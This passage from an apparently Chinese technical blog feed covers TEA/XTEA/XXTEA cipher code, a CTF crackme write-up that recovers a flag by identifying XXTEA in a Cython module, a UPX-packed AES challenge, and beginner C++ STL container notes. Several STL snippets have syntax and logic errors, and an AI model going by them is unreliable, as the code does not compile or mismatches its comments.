v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r=<span class="number">32</span>;<span class="comment">//num_rounds = 32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    decipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等，TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本——XTEA（有时也被称为”tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了。</p>
<h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p><strong>特点：</strong>Corrected Block TEA，原字符串长度可以不是4的倍数了</p>
<h3 id="XXTEA加解密"><a href="#XXTEA加解密" class="headerlink" title="XXTEA加解密"></a>XXTEA加解密</h3><p>XXTEA与TEA类似，都是块加密算法，以下是常规的加密和解密方法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">2</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="题目-sec-cython-so"><a href="#题目-sec-cython-so" class="headerlink" title="题目 sec_cython.so"></a>题目 sec_cython.so</h3><p>main.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sec_cython</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;input your flag:&#x27;</span>)</span><br><span class="line">m = sec_cython.encrypt(flag)</span><br><span class="line"><span class="keyword">if</span> m != <span class="string">&#x27;wrong&#x27;</span>:</span><br><span class="line">    m = [<span class="built_in">hex</span>(x.value) <span class="keyword">for</span> x <span class="keyword">in</span> m]</span><br><span class="line">    m = [<span class="built_in">int</span>(x, <span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> m]</span><br><span class="line">    <span class="keyword">if</span> m != sec_cython.enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Correct!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看来主要的加密是在sec_cython里面的</p>
<p>so文件是Linux相当于windows的dll动态链接库，所以放到kali里面</p>
<p>kali里面写一个python文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sec_cython</span><br><span class="line"><span class="built_in">help</span>(sec_cython)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Help on module sec_cython:</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">    sec_cython</span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    encrypt(v)</span><br><span class="line">    </span><br><span class="line">    sea(v)</span><br><span class="line">    </span><br><span class="line">    string_to_uint32_bytes(string)</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    DELTA = 2654435769</span><br><span class="line">    __test__ = &#123;&#125;</span><br><span class="line">    enc = [235096951, 4274635695, 1983592480, 2346500962, 4098093858, 1778...</span><br><span class="line">    k = [1935954450, 825721906, 305287507, 875914545]</span><br><span class="line"></span><br><span class="line">FILE</span><br><span class="line">    /root/桌面/sec_cython.so</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sec_cython</span><br><span class="line"><span class="built_in">print</span>(sec_cython.enc)</span><br><span class="line"><span class="built_in">print</span>(sec_cython.k)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sec_cython.DELTA))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[235096951, 4274635695, 1983592480, 2346500962, 4098093858, 1778866619, 2372400532, 839025380, 4012226876, 1286419149]</span><br><span class="line"></span><br><span class="line">[1935954450, 825721906, 305287507, 875914545]</span><br><span class="line"></span><br><span class="line">0x9e3779b9</span><br></pre></td></tr></table></figure>

<p>看到了DELTA &#x3D; 0x9e3779b9，所以应该也是TEA家族中的一个，第一个是加密字符，第二个是key</p>
<p>IDA分析一下sec_cython.so</p>
<p>在函数表里面直接搜一下之前<code>help</code>中出来的encrypt：</p>
<p><img src="/2024/09/25/algorithm/image-20241022095726217.png" alt="image-20241022095726217"></p>
<p><code>encrypt</code>前面这一大部分是编译so文件时编译上去的，只看结尾这个encrypt就行</p>
<p>找到下面这个东西，名字看起来是SEA，所以进到这个函数里面查看一下</p>
<p><img src="/2024/09/25/algorithm/image-20241022095938602.png" alt="image-20241022095938602"></p>
<p>看到这里有些熟悉，v5 &#x3D; 10，为密钥的长度；v6 &#x3D; 52，v7 &#x3D; Divide(v6, v5)，这里应该算的就是轮数</p>
<p><img src="/2024/09/25/algorithm/image-20241022153144973.png" alt="image-20241022153144973"></p>
<p><img src="/2024/09/25/algorithm/image-20241022153621796.png" alt="image-20241022153621796"><br><img src="/2024/09/25/algorithm/image-20241022153652118.png" alt="image-20241022153652118"></p>
<p>以上两段也有非常明显的左移5右移2异或，左移3右移4异或的操作</p>
<p>解密代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> rounds = <span class="number">6</span> + (<span class="number">52</span> / n);</span><br><span class="line">    <span class="type">uint32_t</span> sum = rounds * DELTA;</span><br><span class="line">    <span class="type">uint32_t</span> y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span> (rounds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> p = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (p &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> z = v[p - <span class="number">1</span>];</span><br><span class="line">            v[p] -= (((z &gt;&gt; <span class="number">5</span> ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)));</span><br><span class="line">            y = v[p];</span><br><span class="line">            p--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> z = v[n - <span class="number">1</span>];</span><br><span class="line">        v[<span class="number">0</span>] -= (((z &gt;&gt; <span class="number">5</span> ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)));</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">        rounds--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123; <span class="number">0x73645212</span>, <span class="number">0x31378432</span>, <span class="number">0x12325153</span>, <span class="number">0x34356531</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> m[<span class="number">10</span>] = &#123; <span class="number">0xe034b77</span>, <span class="number">0xfec9c3af</span>, <span class="number">0x763b3820</span>, <span class="number">0x8bdcc362</span>,</span><br><span class="line">                      <span class="number">0xf443f322</span>, <span class="number">0x6a0759bb</span>, <span class="number">0x8d67f594</span>, <span class="number">0x320282e4</span>,</span><br><span class="line">                      <span class="number">0xef25b93c</span>, <span class="number">0x4cad32cd</span> &#125;;</span><br><span class="line">    decrypt(m, <span class="keyword">sizeof</span>(m) / <span class="keyword">sizeof</span>(m[<span class="number">0</span>]), k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(m) / <span class="keyword">sizeof</span>(m[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(m[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">            m[i] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="题目-wheel-exe"><a href="#题目-wheel-exe" class="headerlink" title="题目 wheel.exe"></a>题目 wheel.exe</h3><p>打开发现这个程序加了upx壳</p>
<img src="/2024/09/25/algorithm/image-20241102162417886.png" alt="image-20241102162417886" style="zoom:33%;">

<p>用upx -d脱一下壳</p>
<img src="/2024/09/25/algorithm/image-20241102162443548.png" alt="image-20241102162443548" style="zoom:50%;">

<p>IDA已经识别出这是一个aes加密</p>
<p><img src="/2024/09/25/algorithm/image-20241102162722005.png" alt="image-20241102162722005"></p>
]]></content>
  </entry>
  <entry>
    <title>STL</title>
    <url>/2024/07/18/STL/</url>
    <content><![CDATA[<h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><h2 id="vector容器"><a href="#vector容器" class="headerlink" title="vector容器"></a>vector容器</h2><h3 id="创建vector容器"><a href="#创建vector容器" class="headerlink" title="创建vector容器"></a>创建vector容器</h3><p>1.导入头文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>2.构造vector容器</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; v1;		<span class="comment">//空的容器，里面没有元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v2</span><span class="params">(<span class="number">100</span>)</span>;	<span class="comment">//100个元素数据，默认都为0</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v3</span><span class="params">(<span class="number">100</span>,<span class="number">8</span>)</span>;	<span class="comment">//100个值为8的元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v4</span><span class="params">(v3)</span>;		<span class="comment">//100个值为8的元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> nTmpAry[] = &#123;<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>&#125;;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v5</span><span class="params">(nTmpAry + <span class="number">2</span>, nTmpAry + <span class="number">5</span>)</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/18/STL/image-20240718153228054.png" alt="image-20240718153228054"></p>
<h3 id="vector容器添加元素"><a href="#vector容器添加元素" class="headerlink" title="vector容器添加元素"></a>vector容器添加元素</h3><h4 id="1-push-back"><a href="#1-push-back" class="headerlink" title="1.push_back"></a>1.push_back</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">push_back</span>(i);</span><br></pre></td></tr></table></figure>

<p>将元素添加到v1容器的尾部</p>
<p>将元素i添加到v1的尾部</p>
<h4 id="2-insert"><a href="#2-insert" class="headerlink" title="2.insert()"></a>2.insert()</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">insert</span>(v1.<span class="built_in">begin</span>(), <span class="number">99</span>);</span><br></pre></td></tr></table></figure>

<p>从v1的第一个元素开始插入一个99</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">insert</span>(v1.<span class="built_in">begin</span>() + <span class="number">3</span>, <span class="number">2</span>, <span class="number">98</span>);</span><br></pre></td></tr></table></figure>

<p>从v1开始向后偏移三个的位置开始插入两个元素，98</p>
<h4 id="用数组插入"><a href="#用数组插入" class="headerlink" title="用数组插入"></a><strong>用数组插入</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">insert</span>(v1.begin, nTmpAry+<span class="number">3</span>, nTmpAry+<span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<h4 id="3-pop-back"><a href="#3-pop-back" class="headerlink" title="3.pop_back()"></a>3.pop_back()</h4><p>删除容器尾部的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">pop_back</span>();</span><br></pre></td></tr></table></figure>

<p>删除v1尾部最后一个元素</p>
<h4 id="4-erase"><a href="#4-erase" class="headerlink" title="4.erase()"></a>4.erase()</h4><p>删除指定位置的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vi.<span class="built_in">erase</span>(v1.<span class="built_in">begin</span>() + <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>删除起始位置向后偏移三个位置的数值</p>
<p><strong>删除多个元素</strong></p>
<p>需要指定一个范围，同时删除指定区间的元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1.erase(v1.begin(), v1.begin() + 2);</span><br></pre></td></tr></table></figure>

<p>上面一条代码为：删除v1容器前两条元素。第一个索引位置的元素会被删掉，第二个索引位置前一个位置的元素会被删掉，第二个索引位置上的元素不会被删掉。</p>
<h3 id="vector容器的遍历"><a href="#vector容器的遍历" class="headerlink" title="vector容器的遍历"></a>vector容器的遍历</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, i &lt; v1.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span> ,<span class="built_in">v1</span>(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, i &lt; v1.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span> ,v1.<span class="built_in">at</span>(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接遍历v1或者使用at()</p>
<p><strong>使用迭代器</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;:: iterator nIt = v1.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span>(nIt != v1.<span class="built_in">end</span>())</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%3d &quot;</span>, nIt++)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="deque容器"><a href="#deque容器" class="headerlink" title="deque容器"></a>deque容器</h2><p>所有适用于vector的操作都适用于deque容器，将所有上述vector中的所有vector改成deque仍能正确运行</p>
<h3 id="deque容器概述"><a href="#deque容器概述" class="headerlink" title="deque容器概述"></a>deque容器概述</h3><p>1.deque是”double-ended queue”的缩写。在两端增删元素具有较佳的性能</p>
<p>2.模拟动态数组，与vector相似，所有适用于vector的操作都适用于deque</p>
<p>3.deque还有push_font（将元素插到最前面）和pop_font（删除最前面的元素）的操作</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h5 id="push-front"><a href="#push-front" class="headerlink" title="push_front()"></a>push_front()</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">push_front</span>(i);</span><br></pre></td></tr></table></figure>

<p>将i这个元素添加到v1的头部</p>
<h4 id="pop-front"><a href="#pop-front" class="headerlink" title="pop_front()"></a>pop_front()</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">pop_front</span>();</span><br></pre></td></tr></table></figure>

<p>删除v1容器头部的元素</p>
<h2 id="List容器"><a href="#List容器" class="headerlink" title="List容器"></a>List容器</h2><p>1.List是双向链表。<br>2.不支持随机存取，不支持at.[pos]函数和[]操作符<br>3.ist除了具有所有顺序容器都有的成员函数以外，还支持下面成员函数。<br>push front::在前而插入<br>pop_front:删除前而的元素<br>sort:排序(Iist单独实现)<br>remove:删除和指定值相等的元素<br>unique:删除所有和前一个元素相同的元素<br>merge:合并两个链表，并清空被合并的那个(Iist单独实现)<br>reverse:颠倒链表</p>
<p>list链表不支持<code>v1.erase(v1.begin() + 3);</code>这种写法，需要使用迭代器</p>
<img src="/2024/07/18/STL/image-20240916214515246.png" alt="image-20240916214515246" style="zoom:50%;">

<p>可以定义一个函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">list&lt;<span class="type">int</span>&gt;::<span class="function">iterator <span class="title">MoveIteractor</span><span class="params">(list&lt;<span class="type">int</span>&gt;::iterator* pIt, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (*pIt)++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *pIt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(list&lt;<span class="type">int</span>&gt; myList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 迭代器遍历</span></span><br><span class="line">    list&lt;<span class="type">int</span>&gt;::iterator nIt = myList.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span> (nIt!= myList.<span class="built_in">end</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *nIt++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    list&lt;<span class="type">int</span>&gt; myList = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line">    list&lt;<span class="type">int</span>&gt;::iterator it = myList.<span class="built_in">begin</span>();</span><br><span class="line">    myList.<span class="built_in">erase</span>(<span class="built_in">MoveIteractor</span>(&amp;it, <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printList</span>(myList);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，<code>v1.erase(v1.begin() + 3);</code>可以写成<code>v1.erase(MoveIteractor(&amp;v1.begin(), 3));</code></p>
<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><h4 id="1-sort"><a href="#1-sort" class="headerlink" title="1.sort()"></a>1.sort()</h4><p>对list进行排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">sort</span>();</span><br></pre></td></tr></table></figure>

<h4 id="2-remove"><a href="#2-remove" class="headerlink" title="2.remove()"></a>2.remove()</h4><p>删除和指定值相等的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; myList = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="comment">// myList =&gt; 1 2 3 4 5</span></span><br><span class="line">myList.<span class="built_in">remove</span>(<span class="number">3</span>)</span><br><span class="line"><span class="comment">// myList =&gt; 1 2 4 5</span></span><br></pre></td></tr></table></figure>

<h4 id="3-unique"><a href="#3-unique" class="headerlink" title="3.unique()"></a>3.unique()</h4><p>删除所有和前一个元素相同的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; myList = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="comment">// myList =&gt; 1 2 3 4 5 5</span></span><br><span class="line">myList.<span class="built_in">unique</span>()</span><br><span class="line"><span class="comment">// myList =&gt; 1 2 3 4 5</span></span><br></pre></td></tr></table></figure>

<img src="/2024/07/18/STL/image-20240919142608882.png" alt="image-20240919142608882" style="zoom:50%;">

<p>只能删除与前一个相同的，相隔的不行</p>
<h4 id="4-merge"><a href="#4-merge" class="headerlink" title="4.merge()"></a>4.merge()</h4><p>合并两个链表，并清空被合并的那一个</p>
<p>合并两个链表时必须要先对每个链表进行排序，如果直接对一下两个链表进行合并，会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list&lt;int&gt; List1 = &#123; 1, 2, 11, 12, 13, 14, 19, 20 &#125;;</span><br><span class="line">list&lt;int&gt; List2 = &#123; 3, 4, 5, 18, 17 &#125;;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/18/STL/image-20240919143746884.png" alt="image-20240919143746884" style="zoom:50%;">

<p>所以需要先对每个链表进行排序，然后再合并</p>
<p>合并后，所有数据被合并到List1中，List2被清空</p>
<img src="/2024/07/18/STL/image-20240919143837549.png" alt="image-20240919143837549" style="zoom:50%;">

<h4 id="5-reverse"><a href="#5-reverse" class="headerlink" title="5.reverse()"></a>5.reverse()</h4><p>颠倒链表</p>
<img src="/2024/07/18/STL/image-20240919144559547.png" alt="image-20240919144559547" style="zoom:50%;">

<h2 id="set-multiset-容器"><a href="#set-multiset-容器" class="headerlink" title="set &#x2F; multiset 容器"></a>set &#x2F; multiset 容器</h2><p>set&#x2F;multiset容器使用红黑树实现的，底层时树形结构</p>
